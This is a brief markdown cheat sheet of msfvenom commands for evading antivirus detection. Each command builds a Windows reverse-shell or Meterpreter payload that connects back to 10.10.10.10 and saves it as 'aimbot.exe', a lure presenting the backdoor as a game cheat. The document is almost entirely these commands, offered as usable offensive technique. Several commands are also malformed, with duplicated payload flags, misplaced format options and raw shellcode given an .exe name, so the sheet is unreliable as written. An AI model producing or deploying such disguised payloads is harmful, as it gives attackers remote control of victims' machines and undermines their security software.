# MSFvenom Bypasses

## Bypass AV Shellcode Technique

If we create a normal msf payload, then it will get detected by most AV engines (antiscan.me)

### normal payload

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4083 -f exe > aimbot.exe
```

### exe-only flagged

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4928 -f exe-only -o aimbot.exe
```

### raw format

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4928 -f raw -o aimbot.exe
```

### x86 + smallest + psh format

```bash
msfvenom -p windows -a x86 -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4928 -f psh smallest -o aimbot.exe
```

### Custom binary shellcode

```bash
msfvenom -p windows -a x86 -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4928 -c -b \x00\x0a\x0d -o aimbot.exe
```

### x86 + no stage + NOP sled + smallest + raw

```bash
msfvenom -p windows -a x86 -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4928 -f raw smallest -n 100 -o aimbot.exe
```

### x64 exe-only + no stage + smallest + NOP sled

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4928 -f raw -n 100 -o aimbot.exe
```

### x86 + no stage + NOP sled + smallest + raw + custom

```bash
msfvenom -p windows -a x86 -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4928 -f raw smallest -n 100 -b \x00\x0a\x0d -o aimbot.exe
```
